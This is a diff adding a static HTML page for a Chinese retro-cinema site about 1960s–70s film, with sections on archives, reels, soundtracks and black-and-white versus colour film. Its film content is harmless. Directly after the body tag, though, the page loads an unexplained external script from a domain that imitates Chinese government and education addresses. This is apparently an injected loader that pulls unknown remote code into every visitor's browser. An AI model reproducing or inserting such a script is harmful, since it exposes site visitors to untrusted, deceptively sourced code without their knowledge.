@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>6070电影网 | 回到六七十年代银幕的黑白与彩色之间</title>
+<meta name="description" content="6070电影网（https://6070dianyingwang-wap.github.io）是一份静态单页电影内容站，聚焦六七十年代银幕：6070档案、老片卷轴、年代音轨、黑白彩色四个栏目，做经典老片的背景、人物与影史钩沉。">
+<meta name="keywords" content="6070电影网, 6070dianyingwang-wap, 六七十年代电影, 老片卷轴, 年代影史">
+<meta name="author" content="6070电影网">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#3a3124">
+<meta property="og:type" content="website">
+<meta property="og:title" content="6070电影网 | 回到六七十年代银幕的黑白与彩色之间">
+<meta property="og:description" content="6070档案、老片卷轴、年代音轨、黑白彩色：一份聚焦六七十年代银幕的静态单页。">
+<meta property="og:url" content="https://6070dianyingwang-wap.github.io">
+<meta property="og:site_name" content="6070电影网">
+<link rel="canonical" href="https://6070dianyingwang-wap.github.io">
+<style>
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  margin:0;font-size:16px;line-height:1.85;
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",serif;
+  background:#f4efe6;color:#332a1f;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+:root{--max:1180px;--paper:#f4efe6;--ink:#332a1f;--dark:#3a3124;--brown:#6b4a2b;--rust:#a8502b;--gold:#c79a4b;--frame:#dfd3be;--aged:#e8dfca}
+
+/* ===== 顶栏 ===== */
+.site-header{position:sticky;top:0;z-index:60;background:#3a3124;border-bottom:3px double var(--gold)}
+.wrap{max-width:var(--max);margin:0 auto;padding:0 28px;height:72px;display:flex;align-items:center;justify-content:space-between;gap:20px}
+.brand{display:flex;align-items:center;gap:13px}
+.logo{width:44px;height:44px;border:2px solid var(--gold);border-radius:4px;display:grid;place-items:center;font-weight:900;font-size:13px;letter-spacing:-.5px;color:var(--gold);transform:rotate(-3deg)}
+.logo b{color:#fff;font-size:15px;letter-spacing:0}
+.brand .name{font-size:18.5px;font-weight:900;color:#f6ecd8;letter-spacing:.5px}
+.brand em{font-style:normal;font-size:11.5px;letter-spacing:.5px;color:#c7b48f}
+.nav-links{display:flex;gap:2px}
+.nav-links a{padding:9px 13px;font-size:14.5px;border-radius:2px;color:#e6d7bd;transition:.2s}
+.nav-links a:hover{background:var(--rust);color:#fff}
+.menu-btn{display:none;width:44px;height:44px;background:var(--rust);color:#fff;border:0;border-radius:3px;font-size:16px;cursor:pointer;font-weight:900}
+
+/* ===== 通用 ===== */
+section{max-width:var(--max);margin:0 auto;padding:56px 28px}
+.sec-t{display:flex;align-items:baseline;gap:14px;margin-bottom:28px;flex-wrap:wrap;border-bottom:1px dotted var(--frame);padding-bottom:14px}
+.sec-t .no{font-size:11.5px;letter-spacing:2px;color:var(--rust);font-weight:700}
+.sec-t h2{margin:0;font-size:clamp(21px,3vw,29px);font-weight:900;letter-spacing:-.5px}
+.sec-t .more{margin-left:auto;font-size:13.5px;color:var(--rust);border-bottom:1px solid var(--rust);padding-bottom:2px}
+.sec-t .more:hover{color:var(--brown);border-color:var(--brown)}
+
+/* ===== 封面 ===== */
+.cover{padding-top:44px}
+.hero{position:relative;background:var(--dark);color:#f3e9d3;padding:0;overflow:hidden;border:6px solid #2c2519;border-radius:2px}
+.hero-in{display:grid;grid-template-columns:1.1fr .9fr;min-height:430px}
+.hero-left{padding:56px 52px;position:relative;z-index:2}
+.kicker{font-size:11.5px;letter-spacing:4px;color:var(--gold);text-transform:uppercase}
+.hero h1{margin:14px 0 0;font-size:clamp(30px,5vw,50px);line-height:1.14;font-weight:900;letter-spacing:-1px}
+.hero h1 small{display:block;font-size:.42em;letter-spacing:6px;color:#c7b48f;font-weight:700;margin-top:14px}
+.hero p{margin:22px 0 0;font-size:clamp(15px,1.7vw,17px);max-width:52ch;color:#e6d7bd;line-height:1.95}
+.acts{margin-top:26px;display:flex;flex-wrap:wrap;gap:12px}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 26px;border-radius:2px;font-size:14.5px;cursor:pointer;border:1px solid var(--rust);background:var(--rust);color:#fff;transition:.2s;font-weight:800}
+.btn-o{background:transparent;border-color:var(--gold);color:var(--gold)}
+.btn:hover{background:var(--gold);color:#332a1f;border-color:var(--gold)}
+.hero-right{position:relative;background:linear-gradient(135deg,#4a3d29,#2c2519);overflow:hidden;display:flex;align-items:center;justify-content:center}
+/* 胶片条 */
+.film{position:absolute;inset:0;display:flex;flex-direction:column;justify-content:center;gap:26px;padding:30px 0}
+.film .track{display:flex;gap:12px;padding:10px 0 10px 0;background:#1d180f;overflow:hidden;transform:rotate(-4deg) scale(1.15)}
+.film .track.r{transform:rotate(3deg) scale(1.15);background:#241d11}
+.film .cell{width:74px;height:52px;flex:0 0 74px;background:linear-gradient(135deg,#7a6a4a,#4d4030);position:relative}
+.film .cell::after{content:"";position:absolute;inset:6px;border:1px solid rgba(255,255,255,.16)}
+.film .hole{display:flex;flex-direction:column;justify-content:space-between;padding:4px 0}
+.film .hole i{width:10px;height:10px;background:#f4efe6;border-radius:50%;display:block}
+.year-mark{position:relative;z-index:2;text-align:center;color:var(--gold)}
+.year-mark b{display:block;font-size:74px;line-height:1;font-weight:900;letter-spacing:-3px}
+.year-mark span{font-size:12px;letter-spacing:3px;color:#c7b48f}
+
+/* ===== 6070档案 表格式 ===== */
+.archive table{width:100%;border-collapse:collapse;background:#fff;border:1px solid var(--frame);font-size:14.5px}
+.archive th{background:var(--dark);color:var(--gold);text-align:left;padding:13px 16px;font-size:12.5px;letter-spacing:1px;font-weight:700}
+.archive td{padding:15px 16px;border-bottom:1px solid var(--frame);vertical-align:top}
+.archive tr:nth-child(even) td{background:#faf6ee}
+.archive .yr{font-weight:900;color:var(--rust);white-space:nowrap;width:1%}
+.archive .tag{display:inline-block;font-size:11.5px;color:#fff;background:var(--brown);padding:2px 9px;border-radius:2px;margin-right:5px}
+.archive .tag.g{background:var(--gold)}
+.archive .more-row td{background:#f0e9db;text-align:center;font-size:13px}
+.archive a:hover{color:var(--rust)}
+
+/* ===== 老片卷轴 左右交错 ===== */
+.scroll{position:relative}
+.scroll::before{content:"";position:absolute;left:50%;top:0;bottom:0;width:2px;background:var(--frame);transform:translateX(-50%)}
+.reel{display:grid;grid-template-columns:1fr 60px 1fr;align-items:center;padding-bottom:26px;position:relative}
+.reel .mid{width:44px;height:44px;background:var(--rust);border:4px solid var(--paper);border-radius:50%;display:grid;place-items:center;color:#fff;font-size:12px;font-weight:900;z-index:2;justify-self:center}
+.reel .card{background:#fff;border:1px solid var(--frame);padding:22px 24px;position:relative;transition:.25s}
+.reel .card:hover{box-shadow:0 14px 28px rgba(51,42,31,.13)}
+.reel .card .lab{font-size:11.5px;letter-spacing:2px;color:var(--gold);font-weight:700}
+.reel .card h4{margin:6px 0 8px;font-size:18px;font-weight:900}
+.reel .card p{margin:0;font-size:14.5px;color:#6b5c46;line-height:1.9}
+.reel.left .card{grid-column:1}
+.reel.right .card{grid-column:3}
+.reel.left .card::after{content:"";position:absolute;right:-9px;top:24px;width:0;height:0;border-left:9px solid var(--frame);border-top:8px solid transparent;border-bottom:8px solid transparent}
+.reel.right .card::after{content:"";position:absolute;left:-9px;top:24px;width:0;height:0;border-right:9px solid var(--frame);border-top:8px solid transparent;border-bottom:8px solid transparent}
+
+/* ===== 年代音轨 横向条 ===== */
+.track-list{background:#fff;border:1px solid var(--frame);padding:10px}
+.track-row{display:grid;grid-template-columns:64px 1fr 130px 96px;align-items:center;gap:16px;padding:16px;border-bottom:1px dashed var(--frame)}
+.track-row:last-child{border-bottom:0}
+.track-row .num{font-size:22px;font-weight:900;color:var(--frame)}
+.track-row .ttl h4{margin:0;font-size:16.5px;font-weight:900}
+.track-row .ttl span{font-size:12.5px;color:#8a7a5f}
+.wave{height:34px;display:flex;align-items:center;gap:3px}
+.wave i{width:5px;background:var(--brown);border-radius:3px;display:block}
+.track-row .yr{font-size:12.5px;color:var(--rust);font-weight:700;text-align:right}
+
+/* ===== 黑白/彩色 双栏 ===== */
+.bw{display:grid;grid-template-columns:1fr 1fr;border:1px solid var(--frame);overflow:hidden}
+.bw>div{padding:34px 34px}
+.bw .b{background:#2c2c2c;color:#f0ece4}
+.bw .w{background:#faf6ee;color:#332a1f}
+.bw h3{margin:0 0 6px;font-size:22px;font-weight:900}
+.bw .k{font-size:11.5px;letter-spacing:2px;opacity:.7}
+.bw ul{margin:18px 0 0;padding-left:0;list-style:none}
+.bw li{font-size:14.5px;padding:9px 0;border-bottom:1px solid currentColor;opacity:.8}
+.bw li:last-child{border-bottom:0}
+.bw .quote{margin-top:22px;padding:18px;border-left:3px solid var(--gold);font-size:15px;line-height:1.95;opacity:.9}
+
+/* ===== 关于 ===== */
+.about{background:#fff;border:1px solid var(--frame);border-left:5px solid var(--rust);padding:38px 42px}
+.about p{margin:0 0 12px;font-size:15.5px;line-height:1.95}
+.about p:last-child{margin-bottom:0}
+.about p strong{color:var(--rust)}
+.about .grid{margin-top:24px;display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.about .grid a{padding:14px;border:1px solid var(--frame);font-size:13.5px;font-weight:700;text-align:center;transition:.2s;color:var(--dark)}
+.about .grid a:hover{background:var(--rust);color:#fff;border-color:var(--rust)}
+
+/* ===== footer ===== */
+.site-footer{border-top:3px double var(--gold);padding:30px 28px 40px;font-size:13.5px;color:#8a7a5f;background:#e8dfca}
+.site-footer .in{max-width:var(--max);margin:0 auto;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.site-footer a{color:#8a7a5f}
+.site-footer a:hover{color:var(--rust)}
+
+@media (max-width:1000px){
+  .hero-in{grid-template-columns:1fr}
+  .hero-right{min-height:230px}
+  .film .track{transform:rotate(-3deg) scale(1.05)}
+  .film .track.r{transform:rotate(2deg) scale(1.05)}
+  .archive{overflow-x:auto}
+  .archive table{min-width:640px}
+  .bw{grid-template-columns:1fr}
+  .about .grid{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:640px){
+  .wrap{height:56px;padding:0 14px}
+  .brand .name{font-size:15.5px}
+  .brand em{display:none}
+  .menu-btn{display:inline-flex;align-items:center;justify-content:center}
+  .nav-links{position:fixed;top:56px;left:0;right:0;flex-direction:column;background:var(--dark);padding:10px;border-top:2px solid var(--rust);clip-path:inset(0 0 100% 0);transition:.28s ease}
+  .nav-links.open{clip-path:inset(0 0 0 0)}
+  section{padding:42px 14px}
+  .cover{padding-top:24px}
+  .hero-left{padding:34px 22px}
+  .hero h1{font-size:clamp(27px,9vw,36px)}
+  .film{display:none}
+  .scroll::before{left:14px}
+  .reel{grid-template-columns:28px 1fr}
+  .reel .mid{width:28px;height:28px;font-size:10px;border-width:3px;grid-column:1}
+  .reel.left .card,.reel.right .card{grid-column:2}
+  .reel.left .card::after,.reel.right .card::after{left:-9px;right:auto;border-left:0;border-right:9px solid var(--frame)}
+  .track-row{grid-template-columns:44px 1fr;gap:10px}
+  .track-row .yr,.track-row .wave{display:none}
+  .bw>div{padding:26px 20px}
+  .about{padding:28px 20px}
+  .about .grid{grid-template-columns:1fr}
+}
+@media print{body{background:#fff;color:#000}.site-header,.menu-btn,.acts,.site-footer{display:none}section{page-break-inside:avoid}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="site-header">
+  <div class="wrap">
+    <div class="brand">
+      <div class="logo">60<b>70</b></div>
+      <div>
+        <span class="name">6070电影网</span>
+        <em>6070dianyingwang-wap.github.io</em>
+      </div>
+    </div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#archive">6070档案</a>
+      <a href="#scroll">老片卷轴</a>
+      <a href="#track">年代音轨</a>
+      <a href="#bw">黑白 / 彩色</a>
+      <a href="#about">关于</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="打开菜单">✕</button>
+  </div>
+</header>
+
+<main>
+
+  <!-- ===== 封面 ===== -->
+  <section class="cover" id="home">
+    <div class="hero">
+      <div class="hero-in">
+        <div class="hero-left">
+          <div class="kicker">SIXTIES · SEVENTIES</div>
+          <h1>回到六七十年代银幕
+            <small>6070 电影网 · 6070dianyingwang-wap</small>
+          </h1>
+          <p>6070电影网是一份静态单页电影内容站。网站网址：https://6070dianyingwang-wap.github.io。聚焦六七十年代的电影银幕：谈背景、谈人物、谈镜头里那个年代的样子，也谈为什么今天还值得看。</p>
+          <div class="acts">
+            <a class="btn" href="#archive">6070档案</a>
+            <a class="btn btn-o" href="#track">年代音轨</a>
+          </div>
+        </div>
+        <div class="hero-right" aria-hidden="true">
+          <div class="film">
+            <div class="track">
+              <div class="hole"><i></i><i></i><i></i><i></i><i></i></div>
+              <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
+              <div class="hole"><i></i><i></i><i></i><i></i><i></i></div>
+            </div>
+            <div class="track r">
+              <div class="hole"><i></i><i></i><i></i><i></i><i></i></div>
+              <div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div><div class="cell"></div>
+              <div class="hole"><i></i><i></i><i></i><i></i><i></i></div>
+            </div>
+          </div>
+          <div class="year-mark"><b>1960</b><span>— 1979 —</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== 6070档案 ===== -->
+  <section id="archive">
+    <div class="sec-t">
+      <span class="no">01 · 6070 档案</span>
+      <h2>6070 档案</h2>
+      <a class="more" href="#">完整档案 #</a>
+    </div>
+    <div class="archive">
+      <table>
+        <thead>
+          <tr><th style="width:90px">年代</th><th>条目</th><th>地区 / 背景</th><th style="width:150px">类型</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="yr">1962</td><td><strong>新浪潮的余波</strong><br><span style="font-size:13.5px;color:#7a6a52">年轻导演开始用轻便摄影机拍街上的人。</span></td><td>法国 · 欧洲</td><td><span class="tag">写实</span><span class="tag g">作者</span></td></tr>
+          <tr><td class="yr">1964</td><td><strong>类型片里的小人物</strong><br><span style="font-size:13.5px;color:#7a6a52">犯罪、西部不再只是讲英雄，也开始讲失败的人。</span></td><td>美国 · 类型片</td><td><span class="tag">黑色</span></td></tr>
+          <tr><td class="yr">1967</td><td><strong>色彩与反叛同一年</strong><br><span style="font-size:13.5px;color:#7a6a52">影像变亮了，题材也变锋利了。</span></td><td>欧美 · 青年文化</td><td><span class="tag g">时代</span><span class="tag">音乐</span></td></tr>
+          <tr><td class="yr">1969</td><td><strong>慢下来的长镜头</strong><br><span style="font-size:13.5px;color:#7a6a52">一场戏不切，反而比一百个镜头更有压迫感。</span></td><td>苏联 / 欧洲</td><td><span class="tag">长镜头</span></td></tr>
+          <tr><td class="yr">1972</td><td><strong>黑帮与家族</strong><br><span style="font-size:13.5px;color:#7a6a52">家庭伦理被放进犯罪片，格局立刻不同。</span></td><td>美国 · 犯罪</td><td><span class="tag">犯罪</span><span class="tag g">经典</span></td></tr>
+          <tr><td class="yr">1975</td><td><strong>惊悚片的现实感</strong><br><span style="font-size:13.5px;color:#7a6a52">不再靠怪物，而是靠人在极端处境下的选择。</span></td><td>美国 · 惊悚</td><td><span class="tag">惊悚</span></td></tr>
+          <tr><td class="yr">1979</td><td><strong>一个年代的最后一年</strong><br><span style="font-size:13.5px;color:#7a6a52">科幻开始接手，六七十年代的叙事方式也走到一个高点。</span></td><td>全球 · 转折</td><td><span class="tag g">转折</span><span class="tag">科幻</span></td></tr>
+          <tr class="more-row"><td colspan="4"><a href="#">查看十年总览 #</a></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ===== 老片卷轴 ===== -->
+  <section id="scroll" style="padding-top:0">
+    <div class="sec-t">
+      <span class="no">02 · 老片卷轴</span>
+      <h2>老片卷轴</h2>
+      <a class="more" href="#">全部卷轴 #</a>
+    </div>
+    <div class="scroll">
+      <div class="reel left"><div class="card"><div class="lab">卷轴 · 01</div><h4>为什么它现在还能打动人</h4><p>人物面对的不是怪兽，是钱、是时间、是家里那点事。这些问题没过时。</p></div><div class="mid">60</div></div>
+      <div class="reel right"><div class="mid">70</div><div class="card"><div class="lab">卷轴 · 02</div><h4>看老片的三个入口</h4><p>先看人物关系，再看镜头位置，最后听声音。顺序反过来，感受会差很多。</p></div></div>
+      <div class="reel left"><div class="card"><div class="lab">卷轴 · 03</div><h4>那时候的慢，是设计过的</h4><p>留白不是拍得少，是把判断留给观众，让情绪有时间落到自己身上。</p></div><div class="mid">60</div></div>
+      <div class="reel right"><div class="mid">70</div><div class="card"><div class="lab">卷轴 · 04</div><h4>修复版值得看吗</h4><p>值得，但别只看 4K。更该注意声音、色彩与当年放映时的版本差异。</p></div></div>
+      <div class="reel left"><div class="card"><div class="lab">卷轴 · 05</div><h4>老片的偏见也要承认</h4><p>经典名单长期偏向某些地区和性别，重看时也该重新问：谁被漏掉了？</p></div><div class="mid">60</div></div>
+    </div>
+  </section>
+
+  <!-- ===== 年代音轨 ===== -->
+  <section id="track" style="padding-top:0">
+    <div class="sec-t">
+      <span class="no">03 · 年代音轨</span>
+      <h2>年代音轨</h2>
+      <a class="more" href="#">音轨列表 #</a>
+    </div>
+    <div class="track-list">
+      <div class="track-row"><div class="num">01</div><div class="ttl"><h4>爵士与街头的脚步声</h4><span>城市夜戏的标配，节奏就是人物的呼吸。</span></div><div class="wave" aria-hidden="true"><i style="height:30%"></i><i style="height:60%"></i><i style="height:40%"></i><i style="height:80%"></i><i style="height:55%"></i><i style="height:35%"></i><i style="height:70%"></i><i style="height:45%"></i><i style="height:90%"></i><i style="height:50%"></i><i style="height:30%"></i></div><div class="yr">1960</div></div>
+      <div class="track-row"><div class="num">02</div><div class="ttl"><h4>单声道里的压迫感</h4><span>声音从同一个方向来，反而更集中、更紧张。</span></div><div class="wave" aria-hidden="true"><i style="height:50%"></i><i style="height:30%"></i><i style="height:70%"></i><i style="height:45%"></i><i style="height:85%"></i><i style="height:60%"></i><i style="height:40%"></i><i style="height:75%"></i><i style="height:55%"></i><i style="height:35%"></i><i style="height:65%"></i></div><div class="yr">1964</div></div>
+      <div class="track-row"><div class="num">03</div><div class="ttl"><h4>摇滚与青春的对切</h4><span>音乐不再只是配乐，它直接代替人物说话。</span></div><div class="wave" aria-hidden="true"><i style="height:40%"></i><i style="height:80%"></i><i style="height:55%"></i><i style="height:35%"></i><i style="height:70%"></i><i style="height:95%"></i><i style="height:45%"></i><i style="height:60%"></i><i style="height:30%"></i><i style="height:75%"></i><i style="height:50%"></i></div><div class="yr">1967</div></div>
+      <div class="track-row"><div class="num">04</div><div class="ttl"><h4>环境音取代配乐</h4><span>风、车、人群，比旋律更让人记得住。</span></div><div class="wave" aria-hidden="true"><i style="height:35%"></i><i style="height:45%"></i><i style="height:30%"></i><i style="height:60%"></i><i style="height:40%"></i><i style="height:75%"></i><i style="height:50%"></i><i style="height:35%"></i><i style="height:65%"></i><i style="height:45%"></i><i style="height:30%"></i></div><div class="yr">1969</div></div>
+      <div class="track-row"><div class="num">05</div><div class="ttl"><h4>歌剧式的人声</h4><span>对白按唱段写，一个句子就是一段情绪。</span></div><div class="wave" aria-hidden="true"><i style="height:55%"></i><i style="height:35%"></i><i style="height:70%"></i><i style="height:90%"></i><i style="height:50%"></i><i style="height:40%"></i><i style="height:65%"></i><i style="height:30%"></i><i style="height:80%"></i><i style="height:45%"></i><i style="height:60%"></i></div><div class="yr">1972</div></div>
+      <div class="track-row"><div class="num">06</div><div class="ttl"><h4>合成器第一次登场</h4><span>金属质感的音色，把未来提前装进了老片。</span></div><div class="wave" aria-hidden="true"><i style="height:45%"></i><i style="height:65%"></i><i style="height:85%"></i><i style="height:40%"></i><i style="height:30%"></i><i style="height:70%"></i><i style="height:50%"></i><i style="height:90%"></i><i style="height:35%"></i><i style="height:60%"></i><i style="height:45%"></i></div><div class="yr">1979</div></div>
+    </div>
+  </section>
+
+  <!-- ===== 黑白 / 彩色 ===== -->
+  <section id="bw" style="padding-top:0">
+    <div class="sec-t">
+      <span class="no">04 · 黑白 / 彩色</span>
+      <h2>黑白 / 彩色</h2>
+      <a class="more" href="#">对比方法 #</a>
+    </div>
+    <div class="bw">
+      <div class="b">
+        <div class="k">BLACK &amp; WHITE</div>
+        <h3>黑白</h3>
+        <p>没有颜色干扰，光和影子就成了主角。</p>
+        <ul>
+          <li>先看明暗怎么划分画面</li>
+          <li>人脸上的阴影藏着判断</li>
+          <li>高对比常常代表道德分明</li>
+          <li>灰阶层次决定片子老不老</li>
+        </ul>
+        <div class="quote">「黑白不是省成本，是把观众的注意力收回到人的脸上。」</div>
+      </div>
+      <div class="w">
+        <div class="k">IN COLOR</div>
+        <h3>彩色</h3>
+        <p>颜色一进来，信息就变多了，也更容易被导演用来骗人。</p>
+        <ul>
+          <li>谁穿了什么颜色，就是线索</li>
+          <li>红不是情绪，是提醒</li>
+          <li>六七十年代彩色偏暖偏浓</li>
+          <li>修复版有时会被调得太干净</li>
+        </ul>
+        <div class="quote">「六七十年代的彩色偏暖、偏浓，看久了会有一种隔着一层玻璃的距离感。」</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== 关于 ===== -->
+  <section id="about" style="padding-top:0">
+    <div class="sec-t">
+      <span class="no">ABOUT</span>
+      <h2>关于本站</h2>
+      <a class="more" href="#">联系 #</a>
+    </div>
+    <div class="about">
+      <p><strong>网站名称：6070电影网</strong>　<strong>网站网址：https://6070dianyingwang-wap.github.io</strong></p>
+      <p>本站是一份静态单页电影内容站，栏目包括 6070 档案、老片卷轴、年代音轨与黑白 / 彩色，内容定位为六七十年代老片的背景梳理、人物与影史钩沉，不做泛泛的榜单与数量堆砌。</p>
+      <p>本站不提供任何在线播放、下载或盗版资源链接；影片名称与片段描述仅用于评论、研究与年代讨论。本页为单页站点，栏目以锚点定位，内页占位链接以 # 表示，未生成 robots.txt 与 sitemap.xml。</p>
+      <div class="grid">
+        <a href="#">6070档案 #</a><a href="#">老片卷轴 #</a><a href="#">年代音轨 #</a><a href="#">黑白彩色 #</a>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site-footer">
+  <div class="in">
+    <div>© 2026 6070电影网 · 网站名称：6070电影网 · 网站网址：https://6070dianyingwang-wap.github.io · 内容仅供学习与讨论</div>
+    <div><a href="#">返回首页 #</a></div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('menuBtn'),nav=document.getElementById('navLinks');
+  if(!btn||!nav)return;
+  btn.addEventListener('click',function(){nav.classList.toggle('open');btn.textContent=nav.classList.contains('open')?'☰':'✕';});
+  nav.addEventListener('click',function(e){if(e.target.tagName==='A'){nav.classList.remove('open');btn.textContent='✕';}});
+})();
+</script>
+</body>
+</html>
